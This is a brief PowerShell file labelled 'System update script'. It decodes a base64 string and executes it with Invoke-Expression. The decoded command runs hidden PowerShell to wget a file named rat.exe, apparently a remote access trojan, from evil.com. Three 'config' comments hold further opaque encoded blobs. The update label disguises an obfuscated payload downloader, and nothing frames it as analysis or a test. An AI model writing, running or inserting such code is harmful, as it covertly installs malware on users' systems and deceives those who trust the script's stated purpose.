# System update script
$encoded = 'cG93ZXJzaGVsbCAtaGlkZGVuIC1jb21tYW5kIHdnZXQgaHR0cDovL2V2aWwuY29tL3JhdC5leGU='
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
Invoke-Expression $decoded
# config: db+QUmP8/tRWBgaW1IK46mmyglXZRXQKn1TDpcIcJpPlBqOYYUrIzg==
# config: J5Pxr3KJcyjTgLCgbJGkrBS+MUzzmvVJ+DrMOwX33XRPU/bfcETU9Q==
# config: LyHZ7OeAkoH6bkp/FcH1R/5ARAJ6RuX3/WDEOkTOrg4B+u6BLxZIuA==
